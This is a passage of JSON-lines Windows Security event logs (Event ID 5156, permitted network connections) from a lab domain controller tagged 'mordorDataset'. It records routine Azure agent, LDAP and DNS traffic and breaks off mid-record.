{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"52623","FilterRTID":"72497","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3432","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3432\r\n\tApplication Name:\t\\device\\harddiskvolume4\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t52623\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t8037\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t72497\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.980Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:45","Severity":"INFO","EventID":5156,"DestPort":"8037","ThreadID":5480,"RecordNumber":9020754}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"52623","FilterRTID":"72497","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3432","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3432\r\n\tApplication Name:\t\\device\\harddiskvolume4\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t52623\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t8037\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t72497\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.980Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:45","Severity":"INFO","EventID":5156,"DestPort":"8037","ThreadID":5480,"RecordNumber":9020755}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"52623","FilterRTID":"72497","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3432","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3432\r\n\tApplication Name:\t\\device\\harddiskvolume4\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t52623\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t8037\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t72497\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.980Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"8037","ThreadID":5480,"RecordNumber":9020756}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"52623","FilterRTID":"72497","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3432","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3432\r\n\tApplication Name:\t\\device\\harddiskvolume4\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t52623\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t8037\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t72497\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.980Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"8037","ThreadID":5480,"RecordNumber":9020757}
{"Task":12810,"Direction":"%%14592","Opcode":"Info","SourcePort":"52261","FilterRTID":"65851","LayerName":"%%14610","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"fe80::6c96:34e3:33cb:dbba","ProcessId":"704","DestAddress":"fe80::6c96:34e3:33cb:dbba","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windows\\system32\\lsass.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t704\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windows\\system32\\lsass.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tInbound\r\n\tSource Address:\t\tfe80::6c96:34e3:33cb:dbba\r\n\tSource Port:\t\t52261\r\n\tDestination Address:\tfe80::6c96:34e3:33cb:dbba\r\n\tDestination Port:\t\t389\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t65851\r\n\tLayer Name:\t\tReceive/Accept\r\n\tLayer Run-Time ID:\t46","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.980Z","LayerRTID":"46","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"389","ThreadID":5480,"RecordNumber":9020758}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"52261","FilterRTID":"65853","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"fe80::6c96:34e3:33cb:dbba","ProcessId":"3484","DestAddress":"fe80::6c96:34e3:33cb:dbba","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windows\\system32\\dns.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3484\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windows\\system32\\dns.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\tfe80::6c96:34e3:33cb:dbba\r\n\tSource Port:\t\t52261\r\n\tDestination Address:\tfe80::6c96:34e3:33cb:dbba\r\n\tDestination Port:\t\t389\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t65853\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t50","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.980Z","LayerRTID":"50","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"389","ThreadID":5480,"RecordNumber":9020759}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"52261","FilterRTID":"65853","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"fe80::6c96:34e3:33cb:dbba","ProcessId":"3484","DestAddress":"fe80::6c96:34e3:33cb:dbba","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windows\\system32\\dns.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3484\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windows\\system32\\dns.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\tfe80::6c96:34e3:33cb:dbba\r\n\tSource Port:\t\t52261\r\n\tDestination Address:\tfe80::6c96:34e3:33cb:dbba\r\n\tDestination Port:\t\t389\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t65853\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t50","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.980Z","LayerRTID":"50","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"389","ThreadID":5480,"RecordNumber":9020760}
{"Task":12810,"Direction":"%%14592","Opcode":"Info","SourcePort":"52261","FilterRTID":"65851","LayerName":"%%14610","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"fe80::6c96:34e3:33cb:dbba","ProcessId":"704","DestAddress":"fe80::6c96:34e3:33cb:dbba","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windows\\system32\\lsass.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t704\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windows\\system32\\lsass.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tInbound\r\n\tSource Address:\t\tfe80::6c96:34e3:33cb:dbba\r\n\tSource Port:\t\t52261\r\n\tDestination Address:\tfe80::6c96:34e3:33cb:dbba\r\n\tDestination Port:\t\t389\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t65851\r\n\tLayer Name:\t\tReceive/Accept\r\n\tLayer Run-Time ID:\t46","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.981Z","LayerRTID":"46","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"389","ThreadID":5480,"RecordNumber":9020761}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"63406","FilterRTID":"69282","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t63406\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t32526\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69282\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.981Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"32526","ThreadID":5480,"RecordNumber":9020762}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"63406","FilterRTID":"69282","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t63406\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t32526\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69282\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.981Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"32526","ThreadID":5480,"RecordNumber":9020763}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"63406","FilterRTID":"69282","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t63406\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t32526\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69282\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.981Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"32526","ThreadID":5480,"RecordNumber":9020764}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"63406","FilterRTID":"69282","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t63406\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t32526\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69282\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.981Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"32526","ThreadID":5480,"RecordNumber":9020765}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"63406","FilterRTID":"69282","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t63406\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t32526\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69282\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.982Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"32526","ThreadID":5480,"RecordNumber":9020766}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"49685","FilterRTID":"69279","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t49685\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69279\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.982Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"80","ThreadID":5480,"RecordNumber":9020767}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"49685","FilterRTID":"69279","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t49685\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69279\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.982Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"80","ThreadID":5480,"RecordNumber":9020768}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"63406","FilterRTID":"69282","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:47","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t63406\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t32526\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69282\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:47.982Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"32526","ThreadID":5480,"RecordNumber":9020769}
{"Task":12810,"Direction":"%%14592","Opcode":"Info","SourcePort":"49986","FilterRTID":"67835","LayerName":"%%14610","EventReceivedTime":"2020-07-22 00:18:48","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.6","ProcessId":"3484","DestAddress":"172.18.38.5","Protocol":"17","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windows\\system32\\dns.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3484\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windows\\system32\\dns.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tInbound\r\n\tSource Address:\t\t172.18.38.6\r\n\tSource Port:\t\t49986\r\n\tDestination 